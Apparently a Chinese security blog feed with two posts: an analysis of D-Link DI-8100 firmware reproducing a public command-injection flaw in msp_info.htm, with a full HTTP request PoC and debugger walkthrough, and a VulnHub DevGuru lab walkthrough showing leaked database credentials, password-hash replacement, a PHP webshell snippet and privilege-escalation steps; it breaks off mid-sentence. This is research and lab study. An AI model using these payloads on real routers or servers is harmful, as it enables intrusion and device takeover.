    <content type="html"><![CDATA[<h2 id="DI-8100固件分析"><a href="#DI-8100固件分析" class="headerlink" title="DI-8100固件分析"></a>DI-8100固件分析</h2><p>固件名：DI_8100-16.07.26A1.trx</p><ul><li>型号：DI_8100</li><li>版本：16.07.26A1</li><li>官网：<a href="https://www.dlink.com/">https://www.DLINK.com/</a></li><li>测试环境：Ubuntu 22.04</li></ul><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>binwalk -Me 解包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805191441478.png" alt="image-20240805191441478"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cpio</span> 是一个命令行工具，用于创建和提取归档文件，它可以将文件或目录树打包成一个单一的归档文件。这种归档文件可以包含多个文件和目录的完整层次结构，类似于 tar 命令创建的归档文件。与 tar 不同的是，cpio 使用更简单的文件打包格式，并且在一些操作方面更加灵活。<br><br>一般来说，cpio 命令可以用来创建和解压不同类型的归档文件，如 cpio-root 可能指的是一个包含根文件系统的 cpio 归档文件，用于嵌入式系统的初始化或备份恢复。这种用法通常用于嵌入式系统开发或者Linux系统初始化时的一种方法。<br></code></pre></td></tr></table></figure><p>firmwalker</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean">##################################### busybox<br>/bin/busybox<br><br>-------------------- telnet --------------------<br>/usr/sbin/jhttpd  <span class="hljs-comment">//服务</span><br>/usr/sbin/wys  <span class="hljs-comment">//封装很多命令的二进制文件</span><br>/etc_ro/rcS  <span class="hljs-comment">//启动项</span><br>##################################### telnetd<br>/usr/sbin/telnetd   <span class="hljs-comment">//telnet服务端</span><br>-------------------- dropbear --------------------<br>/usr/sbin/jhttpd  <span class="hljs-comment">//服务</span><br></code></pre></td></tr></table></figure><p>firmwalker并未枚举到任何web目录或文件。</p><h4 id="启动项分析"><a href="#启动项分析" class="headerlink" title="启动项分析"></a>启动项分析</h4><p>linux系统的启动顺序</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span>.启动 <span class="hljs-keyword">init</span>：内核启动后，运行 <span class="hljs-operator">/</span><span class="hljs-keyword">init</span><span class="hljs-operator">。</span><br><span class="hljs-number">2</span>.读取 inittab：<span class="hljs-keyword">init</span> 读取 <span class="hljs-regexp">/etc/</span>inittab 文件，确定默认运行级别和要执行的初始进程<span class="hljs-operator">。</span><br><span class="hljs-number">3</span>.执行系统初始化：根据 inittab 中的配置，执行系统初始化脚本和命令<span class="hljs-operator">。</span><br><span class="hljs-number">4</span>.进入运行级别：切换到指定的运行级别，并启动该级别下的所有服务和进程<span class="hljs-operator">。</span><br></code></pre></td></tr></table></figure><p>这里init二进制文件是一个软链接指向了rc</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805150610582.png" alt="image-20240805150610582"></p><p>打开rc二进制文件</p><p>main函数在汇编中可以看到跳入了init_main函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805151010982.png" alt="image-20240805151010982"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs perl">void init_main(void)<br><br>&#123;<br>.......<br>  mount(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;/proc&quot;</span>,<span class="hljs-string">&quot;proc&quot;</span>,<span class="hljs-number">0</span>,(void *)<span class="hljs-number">0x0</span>); <span class="hljs-regexp">//</span> 挂载 proc 文件系统<br>  mount(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;/tmp&quot;</span>,<span class="hljs-string">&quot;ramfs&quot;</span>,<span class="hljs-number">0</span>,(void *)<span class="hljs-number">0x0</span>); <span class="hljs-regexp">//</span> 挂载 ramfs 文件系统<br>  mount(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;/sys&quot;</span>,<span class="hljs-string">&quot;sysfs&quot;</span>,<span class="hljs-number">0</span>,(void *)<span class="hljs-number">0x0</span>); <span class="hljs-regexp">//</span> 挂载 sysfs 文件系统<br>.......<br>  <span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;/var/lock&quot;</span>,<span class="hljs-number">0x1ff</span>); <span class="hljs-regexp">//</span> 创建目录<br>  <span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;/var/tmp/dhcp&quot;</span>,<span class="hljs-number">0x1ff</span>); <span class="hljs-regexp">//</span> 创建目录<br>  <span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;/home/root&quot;</span>,<span class="hljs-number">0x1c0</span>); <span class="hljs-regexp">//</span> 创建目录<br>  <span class="hljs-keyword">chmod</span>(<span class="hljs-string">&quot;/tmp&quot;</span>,<span class="hljs-number">0x1ff</span>); <span class="hljs-regexp">//</span> 修改权限<br>  f_write(<span class="hljs-string">&quot;/etc/hosts&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x1a4</span>); <span class="hljs-regexp">//</span> 写入文件<br>  simple_unlock(&amp;DAT_0041a864); <span class="hljs-regexp">//</span> 解锁<br>  simple_unlock(<span class="hljs-string">&quot;firewall&quot;</span>); <span class="hljs-regexp">//</span> 解锁<br>  simple_unlock(<span class="hljs-string">&quot;restrictions&quot;</span>); <span class="hljs-regexp">//</span> 解锁<br>  simple_unlock(<span class="hljs-string">&quot;nvram_commit&quot;</span>); <span class="hljs-regexp">//</span> 解锁<br>  <span class="hljs-keyword">umask</span>(<span class="hljs-number">0x12</span>); <span class="hljs-regexp">//</span> 设置文件模式创建掩码<br>  __dirp = <span class="hljs-keyword">opendir</span>(<span class="hljs-string">&quot;/rom/etc&quot;</span>); <span class="hljs-regexp">//</span> 打开目录<br>  <span class="hljs-keyword">if</span> (__dirp != (DIR *)<span class="hljs-number">0x0</span>) &#123; <span class="hljs-regexp">//</span> 检查是否成功打开目录<br>    <span class="hljs-keyword">while</span> (pdVar2 = <span class="hljs-keyword">readdir</span>(__dirp), pdVar2 != (dirent *)<span class="hljs-number">0x0</span>) &#123; <span class="hljs-regexp">//</span> 读取目录项<br>      <span class="hljs-keyword">while</span> (pdVar2-&gt;d_name[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;.&#x27;</span>) &#123; <span class="hljs-regexp">//</span> 检查名称是否以 <span class="hljs-string">&#x27;.&#x27;</span> 开头<br>        snprintf(acStack_260,<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>&quot;</span>,&amp;DAT_0041a86c,pdVar2-&gt;d_name); <span class="hljs-regexp">//</span> 构建路径<br>        snprintf(acStack_160,<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>&quot;</span>,&amp;DAT_0041a870,pdVar2-&gt;d_name); <span class="hljs-regexp">//</span> 构建路径<br>        <span class="hljs-keyword">symlink</span>(acStack_260,acStack_160); <span class="hljs-regexp">//</span> 创建符号链接<br>        pdVar2 = <span class="hljs-keyword">readdir</span>(__dirp); <span class="hljs-regexp">//</span> 读取下一个目录项<br>        <span class="hljs-keyword">if</span> (pdVar2 == (dirent *)<span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> LAB_00405234; <span class="hljs-regexp">//</span> 如果为空则跳转<br>      &#125;<br>    &#125;<br>.......<br>LAB_004063c4:                      <br>    start_jhttpd();                <span class="hljs-regexp">//</span> 启动 HTTP 服务器<br>    jhttpd_run = <span class="hljs-number">1</span>;                <span class="hljs-regexp">//</span> 设置 jhttpd_run 标志为 <span class="hljs-number">1</span>，表示 HTTP 服务器正在运行<br>    start_services();              <span class="hljs-regexp">//</span> 启动其他服务<br>    jhl_start_wan_all(<span class="hljs-number">0</span>);          <span class="hljs-regexp">//</span> 启动所有 WAN 接口，参数 <span class="hljs-number">0</span> 可能是配置选项<br>    <span class="hljs-keyword">if</span> (jhl_yy_run == <span class="hljs-number">0</span>)           // 检查 jhl_yy_run 标志是否为 <span class="hljs-number">0</span><br>        <span class="hljs-keyword">goto</span> LAB_00406408;         <span class="hljs-regexp">//</span> 如果 jhl_yy_run 为 <span class="hljs-number">0</span>，跳转到标签 LAB_00406408<br>LAB_00406094:                      <span class="hljs-regexp">//</span> 标签 LAB_00406094，指示代码块的开始<br>    start_dhcp_server();           <span class="hljs-regexp">//</span> 启动 DHCP 服务器<br>    start_openvpn();               <span class="hljs-regexp">//</span> 启动 OpenVPN 服务<br>    pppoe_srv_start(&amp;DAT_0041afe8);<span class="hljs-regexp">//</span> 启动 PPPoE 服务器，并传递地址 &amp;DAT_0041afe8 作为参数<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;                           <span class="hljs-regexp">//</span> <span class="hljs-keyword">else</span> 分支，处理 jhl_yy_run 不为 <span class="hljs-number">0</span> 的情况<br>    jhl_start_vlan(<span class="hljs-number">0</span>);             <span class="hljs-regexp">//</span> 启动 VLAN 配置，参数 <span class="hljs-number">0</span> 可能是配置选项<br>    start_vlan();                  <span class="hljs-regexp">//</span> 启动 VLAN 服务<br>    start_lan();                   <span class="hljs-regexp">//</span> 启动 LAN 服务<br>    <span class="hljs-keyword">if</span> (jhttpd_run == <span class="hljs-number">0</span>)           // 检查 jhttpd_run 标志是否为 <span class="hljs-number">0</span><br>        <span class="hljs-keyword">goto</span> LAB_004063c4;         <span class="hljs-regexp">//</span> 如果 jhttpd_run 为 <span class="hljs-number">0</span>，跳转到标签 LAB_004063c4<br>.......<br>&#125;<br></code></pre></td></tr></table></figure><p>进入start_jhttpd()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">start_jhttpd</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)<br><br>&#123;<br>  <span class="hljs-title function_">_xstart</span>(<span class="hljs-string">&quot;jhttpd&quot;</span>,<span class="hljs-number">0</span>);<br>  pid_jhttpd = <span class="hljs-number">0xfffffffe</span>;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入_xstart(“jhttpd”,0);</p><p>定位到了libshared.so库中</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805155942930.png" alt="image-20240805155942930"></p><p>进入_eval_nowait函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805160130918.png" alt="image-20240805160130918"></p><p>jhttpd，0 参数应该在这里被执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">execvp 函数被用来在当前进程的上下文中执行一个新的程序。<br>它会取代当前进程的内存映像（代码、数据和堆栈），加载并执行指定的程序。<br>execvp 是属于 <span class="hljs-built_in">exec</span> 函数族的一员，这个函数族包括了多个变种，如 execve, execl, execle 等，区别在于参数传递方式和路径搜索方式。<br></code></pre></td></tr></table></figure><p>rcS文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#!/bin/sh<br>mount -<span class="hljs-selector-tag">a</span>   <span class="hljs-comment">//挂载</span><br>mkdir -<span class="hljs-selector-tag">p</span> /var/run  <br>cat /etc_ro/motd<br>nvram_daemon&amp;   <span class="hljs-comment">//启动nvram守护进程</span><br>goahead&amp;        <span class="hljs-comment">//启动goahead，但是这固件并不存在goahead，程序员的锅</span><br><br><span class="hljs-selector-id">#for</span> telnet debugging<br>telnetd   <span class="hljs-comment">//启动telnet</span><br><br><span class="hljs-selector-id">#for</span> syslogd<br>mkdir -<span class="hljs-selector-tag">p</span> /var/log<br><span class="hljs-selector-id">#samba</span><span class="hljs-selector-class">.sh</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.254</span>/<span class="hljs-number">24</span> ralink rt3052<br><br><span class="hljs-selector-id">#the</span> following config <span class="hljs-keyword">for</span> RT3052 FPGA only<br><span class="hljs-selector-id">#reg</span> s b0110000<br><span class="hljs-selector-id">#reg</span> w c8 <span class="hljs-number">20</span>f02b28<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">0</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">4</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">4</span> -v <span class="hljs-number">1061</span><br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">0</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#mii_mgr</span> -s -<span class="hljs-selector-tag">p</span> <span class="hljs-number">4</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">0</span> -v b100<br><span class="hljs-selector-id">#reg</span> w c8 <span class="hljs-number">3</span>ff02b28<br></code></pre></td></tr></table></figure><p>这个固件比较奇葩的是没有web文件，所有的web文件全部封装在二进制jhttpd中</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805172306721.png" alt="image-20240805172306721"></p><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>firmAE模拟成功</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805191305424.png" alt="image-20240805191305424"></p><h3 id="命令注入1day分析"><a href="#命令注入1day分析" class="headerlink" title="命令注入1day分析"></a>命令注入1day分析</h3><p>Description<br>A vulnerability, which was classified as critical, has been found in D-Link DI-8100 16.07. This issue affects the function msp_info_htm of the file msp_info.htm. The manipulation of the argument cmd leads to command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-273521 was assigned to this vulnerability.</p><p>已知msp_info存在命令注入</p><p>ida打开jhttpd，搜索字符串msp_info定位到msp_info_htm</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805162232194.png" alt="image-20240805162232194"></p><p>参数传递如图所示</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805162324012.png" alt="image-20240805162324012"></p><p>这里对传入的参数没有任何过滤，所以造成命令执行</p><p>试一下</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805163634264.png" alt="image-20240805163634264"></p><p>命令执行poc</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /msp_info.htm?flag=cmd&amp;cmd=%<span class="hljs-number">60</span>%<span class="hljs-number">65</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">62</span>%<span class="hljs-number">62</span>%<span class="hljs-number">60</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span><br><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Ubuntu; Linux x86_64; rv:<span class="hljs-number">128</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">128</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/png,image/svg+xml,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><br><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><br><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">Cookie</span>: wys_userid=admin,wys_passwd=<span class="hljs-number">520</span>E1BFD4CDE217D0A5824AE7EA60632<br><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span>, i<br></code></pre></td></tr></table></figure><p>接下来动调</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">gdb-multiarch ./usr/sbin/jhttpd -<span class="hljs-variable language_">x</span> <span class="hljs-variable language_">script</span><br></code></pre></td></tr></table></figure><p>发的包就是上面的poc</p><p>打断点到0044D74C，也就是msp_info_htm的开头</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805173200857.png" alt="image-20240805173200857"></p><p>第一个httpd_get_parm获取到flag参数的值</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183037865.png" alt="image-20240805183037865"></p><p>strcmp开始比较flag参数的值</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183321904.png" alt="image-20240805183321904"></p><p>下断点直接到判断是否为cmd的位置</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183910293.png" alt="image-20240805183910293"></p><p>flag参数的cmd匹配成功，跳转到if判断内部</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805184751826.png" alt="image-20240805184751826"></p><p>跳入http_get_parm函数截取cmd参数的值</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805185748700.png" alt="image-20240805185748700"></p><p>V0寄存器获取到cmd的参数值</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190106386.png" alt="image-20240805190106386"></p><p>snprintf开始拼接系统命令</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190544005.png" alt="image-20240805190544005"></p><p>system函数执行</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190645152.png" alt="image-20240805190645152"></p><p>执行成功   </p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190737110.png" alt="image-20240805190737110"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_DevGuru_1</title>
    <link href="/2023/11/01/vulnhub-DevGuru-1/"/>
    <url>/2023/11/01/vulnhub-DevGuru-1/</url>
    
    <content type="html"><![CDATA[<h3 id="VulnHub-DevGuru-1"><a href="#VulnHub-DevGuru-1" class="headerlink" title="VulnHub-DevGuru 1"></a>VulnHub-DevGuru 1</h3><p><a href="https://blog.csdn.net/qq_32261191/article/details/119458137">https://blog.csdn.net/qq_32261191/article/details/119458137</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap 10.188.10.12<br>22/tcp open  ssh<br>80/tcp open  http<br>8585/tcp open http     gitea<br>dirsearch -u http://10.188.10.12<br>[22:19:00] 200 -    4KB - /adminer.php<br>[22:19:05] 302 -  406B  - /backend/  -&gt;  http://10.188.10.12/backend/backend/auth<br>....一堆/.git/xxx<br></code></pre></td></tr></table></figure><p>adminer.php</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110222038790.png" alt="image-20231110222038790"></p><p>backend</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110222131339.png" alt="image-20231110222131339"></p><p>git目录下全部200状态码，怎么处理</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dart">cd /opt/GitHack-master/<br>python3 GitHack.py http:<span class="hljs-comment">//10.188.10.12/.git</span><br>翻到<br>        <span class="hljs-string">&#x27;mysql&#x27;</span> =&gt; [<br>            <span class="hljs-string">&#x27;driver&#x27;</span>     =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>            <span class="hljs-string">&#x27;engine&#x27;</span>     =&gt; <span class="hljs-string">&#x27;InnoDB&#x27;</span>,<br>            <span class="hljs-string">&#x27;host&#x27;</span>       =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>            <span class="hljs-string">&#x27;port&#x27;</span>       =&gt; <span class="hljs-number">3306</span>,<br>            <span class="hljs-string">&#x27;database&#x27;</span>   =&gt; <span class="hljs-string">&#x27;octoberdb&#x27;</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span>   =&gt; <span class="hljs-string">&#x27;october&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>   =&gt; <span class="hljs-string">&#x27;SQ66EBYx4GT3byXH</span><br></code></pre></td></tr></table></figure><p>连接adminer.php</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110222635288.png" alt="image-20231110222635288"></p><p>在backend_users表中发现登录用户frank和密码Hash：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-string">$2</span>y<span class="hljs-string">$1</span>0<span class="hljs-string">$b</span>p5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK<br><br>└─# hashid &#x27;<span class="hljs-string">$2</span>y<span class="hljs-string">$1</span>0<span class="hljs-string">$b</span>p5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK&#x27;<br>Analyzing &#x27;<span class="hljs-string">$2</span>y<span class="hljs-string">$1</span>0<span class="hljs-string">$b</span>p5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK&#x27;<br>[+] Blowfish(OpenBSD) <br>[+] Woltlab Burning Board <span class="hljs-number">4</span>.x <br>[+] bcrypt <br><br></code></pre></td></tr></table></figure><p>放弃破解密码hash，搜索原有hash开头 $2y$10，生成一个新的hash修改frank的密码或者新建一个用户</p><p><a href="https://bcrypt-generator.com/">https://bcrypt-generator.com</a>    该网站生成bcrypt  123456</p><p>然后登录backend</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110223417530.png" alt="image-20231110223417530"></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onStart</span>()<br>&#123;<br>    <span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">page</span>[<span class="hljs-string">&quot;PoisonVar&quot;</span>] = <span class="hljs-params">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>访问url？cmd&#x3D; 反弹shell得到一个www-data的权限</p><p>linenum枚举，仔细查看 一个app.ini.bak备份文件中出现了另一个数据库gitea的用户名密码</p><p>然后通过adminer.php登录找到user表</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110223632623.png" alt="image-20231110223632623"></p><p>想修改密码然后通过8585端口 登录这是一个五十位 的hash，无法确定加密方式，翻gitea的github源码，找到加密方式</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110223857090.png" alt="image-20231110223857090"></p><p>加密方式为pbkdf2  盐值在数据库表里有，10000次加密，50位</p><p><a href="https://neurotechnics.com/tools/pbkdf2-test">https://neurotechnics.com/tools/pbkdf2-test</a>   生成hash</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110224029311.png" alt="image-20231110224029311"></p><p>​生成hash，然后修改到数据库的frank用户密码上，在8585端口的gitea页面登录</p><p>gitea有一个githook可以rce</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-1/image-20231110224231511.png" alt="image-20231110224231511"></p><p>得到一个frank用户的权限</p><p>sudo -l   发现一个&#x2F;usr&#x2F;bin&#x2F;sqlite3</p><p><strong>sqlite3 